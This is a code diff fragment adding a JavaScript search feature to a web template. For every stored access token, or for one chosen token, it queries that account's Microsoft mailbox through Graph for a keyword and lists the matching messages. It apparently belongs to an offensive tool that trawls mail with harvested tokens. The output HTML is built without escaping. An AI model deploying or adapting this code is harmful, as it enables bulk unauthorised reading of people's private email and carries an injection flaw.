+    resultsEl.style.display = 'block';
+    resultsEl.innerHTML = '<div style="padding:12px;text-align:center;color:var(--gs-text-muted)"><div class="spin" style="width:20px;height:20px;border:2px solid var(--gs-border);border-top-color:var(--gs-accent);border-radius:50%;animation:sp .6s linear infinite;margin:0 auto 8px"></div>Searching...</div>';
+
+    // Get token IDs to search
+    $.get('/api/list_users', function(data) {
+        var users = typeof data === 'string' ? JSON.parse(data) : data;
+        var targets = [];
+        if (userTid === 'all') {
+            users.forEach(function(u) { if (u.access_token_id) targets.push({tid: u.access_token_id, email: u.email}); });
+        } else {
+            var u = users.find(function(u){ return u.access_token_id == userTid; });
+            if (u) targets.push({tid: u.access_token_id, email: u.email});
+        }
+
+        var allResults = [];
+        var done = 0;
+        if (!targets.length) { resultsEl.innerHTML = '<div style="padding:12px;color:var(--gs-text-muted)">No users to search</div>'; return; }
+
+        targets.forEach(function(t) {
+            var searchUri = 'https://graph.microsoft.com/v1.0/me/messages?$top=25&$search="' + encodeURIComponent(keyword) + '"&$select=subject,from,receivedDateTime,bodyPreview';
+            $.ajax({ type: 'POST', url: '/api/generic_graph', data: { access_token_id: t.tid, graph_uri: searchUri },
+                success: function(r) {
+                    var d = typeof r === 'string' ? JSON.parse(r) : r;
+                    if (d.value) {
+                        d.value.forEach(function(e) {
+                            allResults.push({
+                                user: t.email,
+                                subject: e.subject || '(No Subject)',
+                                from: e.from ? e.from.emailAddress.address : '?',
+                                date: e.receivedDateTime ? new Date(e.receivedDateTime).toLocaleDateString() : '?',
+                                preview: (e.bodyPreview || '').substring(0, 100)
+                            });
+                        });
+                    }
+                },
+                complete: function() {
+                    done++;
+                    if (done === targets.length) {
+                        if (!allResults.length) { resultsEl.innerHTML = '<div style="padding:12px;color:var(--gs-text-muted)">No results for "'+keyword+'"</div>'; return; }
+                        var html = '<div style="font-size:12px;color:var(--gs-text-muted);padding:8px 0">Found '+allResults.length+' result(s) for "'+keyword+'"</div>';
+                        html += '<table class="table table-sm" style="font-size:12px"><thead><tr><th>User</th><th>From</th><th>Subject</th><th>Date</th></tr></thead><tbody>';
+                        allResults.forEach(function(r) {
+                            html += '<tr><td style="color:var(--gs-accent)">'+r.user+'</td><td>'+r.from+'</td><td>'+r.subject+'</td><td>'+r.date+'</td></tr>';
+                        });
+                        html += '</tbody></table>';
+                        resultsEl.innerHTML = html;
+                    }
+                }
+            });
+        });
+    });
+}
+</script>
+{%endblock content%}
